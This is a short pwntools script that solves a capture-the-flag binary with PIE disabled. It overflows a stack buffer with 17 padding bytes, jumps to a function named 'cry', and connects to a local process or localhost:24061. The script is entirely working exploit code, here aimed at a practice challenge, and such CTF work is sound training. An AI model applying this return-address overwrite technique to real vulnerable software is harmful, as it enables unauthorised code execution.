#!/usr/bin/python3

# Solves the binary that PIE disabled.

from pwn import *

exe = ELF('public/chall')
context.binary = exe

cry = exe.symbols['cry']
# pwndbg> distance $rbp-0x9 0x7fffffffd278
# 0x7fffffffd267->0x7fffffffd278 is 0x11 bytes (0x2 words)
if args.LOCAL:
    conn = exe.process()
else:
    conn = remote("localhost", 24061)
buf = flat(b'A'*17, cry)
# conn.sendlineafter(b':', buf)
# conn.recvuntil(b"Please enter your name:")
conn.sendline(buf)
conn.interactive()